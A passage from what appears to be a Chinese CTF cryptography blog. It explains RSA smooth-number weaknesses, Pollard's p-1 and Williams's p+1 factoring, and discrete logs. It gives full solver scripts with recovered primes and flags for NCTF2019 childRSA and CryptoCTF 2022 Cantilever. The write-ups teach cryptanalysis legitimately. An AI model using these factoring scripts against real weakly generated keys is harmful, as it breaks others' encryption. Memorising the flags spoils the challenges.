class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = <span class="built_in">float</span>(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) +</span><br><span class="line">        hamming_distance(b5, b6)</span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = <span class="built_in">sorted</span>(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = <span class="built_in">bytearray</span>(keys * <span class="built_in">len</span>(b), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;keysize:&quot;</span>, KEYSIZE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key is:&quot;</span>, keys, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">        s = <span class="built_in">bytes</span>.decode(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>





<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/">https://fitzbc.github.io/2019/08/04/De1CTF-xorz-Writeup/</a></p>
<p><a href="https://www.anquanke.com/post/id/161171#h2-0">https://www.anquanke.com/post/id/161171#h2-0</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA光滑数问题 - 待完成</title>
    <url>/posts/20e69e95/</url>
    <content><![CDATA[<p>简述</p>
<p>光滑数【Smooth number】： 指 可以分解为小素数乘积的正整数</p>
<p>B-Smooth数： 如果一个整数的所有素因子都不大于B 那称这个数位B-Smooth数【例如 12 = 2<em>2</em>3 所以 12是3-Smooth数】</p>
<p>当p是N的因数，并且 p-1 是 光滑数，可以考虑   Pollard’s p-1 算法分解N</p>
<p>当p是N的因数，并且 p+1 是 光滑数，可以考虑  Williams’s p+1 算法来分解N</p>
<h3 id="p-1光滑"><a href="#p-1光滑" class="headerlink" title="p-1光滑"></a>p-1光滑</h3><p>根据费马小定理 </p>
<p><img src="/posts/20e69e95/1.png"></p>
<p>有：  若p ∤ a, 则a^(p−1) ≡ 1 (mod p)</p>
<p>则有： a^t*(p−1) ≡ 1^t ≡ 1 (mod p)</p>
<p>即   a^(p-1) -1 = k*p  【$a^{t(p-1)} - 1$ 是 $p$ 的倍数 】</p>
<h4 id="Pollard’s-p-1算法："><a href="#Pollard’s-p-1算法：" class="headerlink" title="Pollard’s p-1算法："></a>Pollard’s p-1算法：</h4><p>如果 p-1 是很小质数的乘积  那么 n! 就能被 p-1 整除。  即 n! = t(p-1)   【 (p-1) | B! 】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="NCTF2019-childRSA"><a href="#NCTF2019-childRSA" class="headerlink" title="[NCTF2019] childRSA"></a>[NCTF2019] childRSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)  <span class="comment"># primes 为前10000个素数的列表</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p, q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"><span class="comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br></pre></td></tr></table></figure>

<p>p q 均属有 多个小指数乘积+1 得到    即 p-1为多个小指数的乘积。利用 Pollar’s p-1算法分解N</p>
<p>WP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">C = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接套 Pollard&#x27;s p-1算法 求出 p q </span></span><br><span class="line"><span class="comment"># py下跑 sage跑有问题</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (res - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(C, d, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;NCTF&#123;Th3r3_ar3_1ns3cure_RSA_m0duli_7hat_at_f1rst_gl4nce_appe4r_t0_be_s3cur3&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="CryptoCTF-2022-Cantilever-60-solves"><a href="#CryptoCTF-2022-Cantilever-60-solves" class="headerlink" title="CryptoCTF 2022 Cantilever (60 solves) *"></a>CryptoCTF 2022 Cantilever (60 solves) *</h3><blockquote>
<p>What if you can find the message? If you can, that means you are genius, because we harden our crypto system with a very modern tool!</p>
</blockquote>
<p>Challenge</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_primes</span>(<span class="params">nbit, imbalance</span>):</span><br><span class="line">    p = <span class="number">2</span></span><br><span class="line">    FACTORS = [p]</span><br><span class="line">    <span class="keyword">while</span> p.bit_length() &lt; nbit - <span class="number">2</span> * imbalance:</span><br><span class="line">        factor = getPrime(imbalance)</span><br><span class="line">        FACTORS.append(factor)</span><br><span class="line">        p *= factor</span><br><span class="line">    rbit = (nbit - p.bit_length()) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r, s = [getPrime(rbit) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&#x27;01&#x27;</span>]</span><br><span class="line">        _p = p * r * s</span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &lt; nbit: rbit += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> _p.bit_length() &gt; nbit: rbit -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(_p + <span class="number">1</span>):</span><br><span class="line">            FACTORS.extend((r, s))</span><br><span class="line">            p = _p + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    FACTORS.sort()</span><br><span class="line">    <span class="keyword">return</span> (p, FACTORS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">nbit, imbalance, e</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p, FACTORS = gen_primes(nbit // <span class="number">2</span>, imbalance)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(FACTORS) != <span class="built_in">len</span>(<span class="built_in">set</span>(FACTORS)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        q, q_factors = gen_primes(nbit // <span class="number">2</span>, imbalance + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(q_factors) != <span class="built_in">len</span>(<span class="built_in">set</span>(q_factors)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        factors = FACTORS + q_factors</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> factors:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> n, (p, q)</span><br><span class="line"></span><br><span class="line">nbit = <span class="number">2048</span></span><br><span class="line">imbalance = <span class="number">19</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">m_1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>])</span><br><span class="line">m_2 = bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">n, PRIMES = genkey(nbit, imbalance, e)</span><br><span class="line"></span><br><span class="line">c_1 = <span class="built_in">pow</span>(m_1, e, n)</span><br><span class="line">c_2 = <span class="built_in">pow</span>(e, m_2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_1 = <span class="subst">&#123;c_1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c_2 = <span class="subst">&#123;c_2&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>p-1 光滑 </p>
<p>n  2^19-smooth</p>
<p>利用 Pollard p-1 算法分解n</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line">c_1 = <span class="number">488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line">c_2 = <span class="number">109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接套 Pollard&#x27;s p-1算法 通过c_1 求出 p q</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (res - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c_1, d, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p= 83408372012221120677052349409462320990177094246143674474872152829440524098582262384066400107950985845255268335597502228206679771838750219696329523257176739436871327238322817403970284015587320158034304282786944710043150568360761457471641695390427267786485448748458445872307883254297662715749746270343116946519</span></span><br><span class="line"><span class="comment"># q= 84761154786085445040051273337185621770653977624442810400422736258693219544281946893222923335092616440575888204882883202879374137962201839964482318483860286412488851522612902055732831909496637360268825720155284438779235801463340052531340653630637729255285872455686692027630814695155220888112228977346697309127</span></span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s_&#x27;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>c_1 = pow(m_1, e, n)</p>
<p>c_2 = pow(e, m_2, n)</p>
<p>c2 = e^ m_2  mod n     e^m2 = c2 + k*n</p>
<p>c2 e n 都已知 求m2</p>
<p>m2 = loge(c2)</p>
<p>利用sage   </p>
<p>GFp = GF(p)  # 有限域</p>
<p> log(GFp(c_2), e)</p>
</blockquote>
<p>离散对数 Pohlig-Hellman算法求m2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line">c_1 = <span class="number">488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line">c_2 = <span class="number">109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">83408372012221120677052349409462320990177094246143674474872152829440524098582262384066400107950985845255268335597502228206679771838750219696329523257176739436871327238322817403970284015587320158034304282786944710043150568360761457471641695390427267786485448748458445872307883254297662715749746270343116946519</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)//GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">d1 = <span class="built_in">int</span>(inverse(e, phi))</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(c_1), d1,n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义有限域 GF(p) GF(q)</span></span><br><span class="line">Fp = GF(p)</span><br><span class="line">Fq = GF(q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c2 e 转换为 GF()中的元素</span></span><br><span class="line">c2p = Fp(c_2)</span><br><span class="line">c2q = Fq(c_2)</span><br><span class="line">ep = Fp(e)</span><br><span class="line">eq = Fq(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 loge(c2)</span></span><br><span class="line">dp = discrete_log(c2p, ep)</span><br><span class="line">dq = discrete_log(c2q, eq)</span><br><span class="line"><span class="comment"># 中国剩余定理CRT 计算 满足 m^e = c2 mod n 的 m的值</span></span><br><span class="line">m2 = <span class="built_in">int</span>(crt([dp,dq],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">m = long_to_bytes(m1) + long_to_bytes(m2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;_s1lK__Ri9H7?!&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s__s1lK__Ri9H7?!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="p-1光滑-1"><a href="#p-1光滑-1" class="headerlink" title="p+1光滑"></a>p+1光滑</h3><h4 id="Williams’s-p-1算法"><a href="#Williams’s-p-1算法" class="headerlink" title="Williams’s p+1算法"></a>Williams’s p+1算法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v, a, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Helper function for williams_pp1().  Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot;</span></span><br><span class="line">    v1, v2 = v, (v**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]: v1, v2 = ((v1**<span class="number">2</span> - <span class="number">2</span>) % n, (v1*v2 - v) % n) <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span> <span class="keyword">else</span> ((v1*v2 - v) % n, (v2**<span class="number">2</span> - <span class="number">2</span>) % n)</span><br><span class="line">    <span class="keyword">return</span> v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primegen():</span><br><span class="line">        e = ilog(isqrt(n), p)</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(e): v = mlucas(v, p, n)</span><br><span class="line">        g = gcd(v-<span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n: <span class="keyword">return</span> g <span class="comment"># g|n</span></span><br><span class="line">        <span class="keyword">if</span> g == n: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h3 id="综合例题"><a href="#综合例题" class="headerlink" title="综合例题"></a>综合例题</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gmpy2.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gmpy2.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime_2</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gmpy2.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gmpy2.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">start, modulus, a, b, c, d</span>):</span><br><span class="line">    arr = []</span><br><span class="line">    arr.append(start)</span><br><span class="line">    arr.append(start+<span class="number">1</span>)</span><br><span class="line">    arr.append(start+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">100</span>):</span><br><span class="line">        arr.append((a * arr[-<span class="number">3</span>] + b * arr[-<span class="number">2</span>] + c * arr[-<span class="number">1</span>] + d) % modulus)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">p1 = gen_prime(<span class="number">256</span>)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gen_prime_2(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span> p1 &gt; q1</span><br><span class="line"><span class="keyword">assert</span> p2 &gt; q2</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">n2 = p2 * q2</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n1 = %s&quot;</span> % <span class="built_in">str</span>(n1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n2 = %s&quot;</span> % <span class="built_in">str</span>(n2)</span><br><span class="line"></span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;r = %s&quot;</span> % <span class="built_in">str</span>(r)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">m = s2n(flag)</span><br><span class="line"></span><br><span class="line">arr = generate(m, r, p1, q1, p2, q2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100] = %s&quot;</span> % <span class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100+1] = %s&quot;</span> % <span 